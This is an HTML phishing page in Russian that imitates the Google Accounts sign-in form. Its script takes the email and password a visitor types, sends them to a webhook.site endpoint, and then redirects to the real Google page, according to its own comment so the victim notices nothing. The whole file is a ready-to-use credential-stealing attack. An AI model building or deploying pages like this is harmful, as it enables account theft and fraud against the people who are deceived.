<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход – Google Аккаунты</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { margin-bottom: 25px; font-size: 16px; color: #202124; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 13px; margin: 10px 0;
            border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px;
        }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .create-acc { color: #1a73e8; font-weight: 500; cursor: pointer; text-decoration: none; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
        button:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
    <h1>Вход</h1>
    <p>Используйте аккаунт Google</p>
    
    <form id="loginForm">
        <input type="text" id="email" placeholder="Телефон или адрес эл. почты" required>
        <input type="password" id="pass" placeholder="Введите пароль" required>
        
        <div class="btn-container">
            <span class="create-acc">Создать аккаунт</span>
            <button type="submit">Далее</button>
        </div>
    </form>
</div>

<script>
    const webhookUrl = "https://webhook.site/21343d2d-95a5-47a5-b00a-a60d1491ff14";

    document.getElementById('loginForm').onsubmit = function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        // Отправка данных на твой Webhook
        fetch(`${webhookUrl}?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}&type=LOGIN_TEST`)
        .then(() => {
            // После отправки перекидываем на настоящий Google, чтобы не было подозрений
            window.location.href = "https://accounts.google.com";
        });
    };
</script>

</body>
</html>
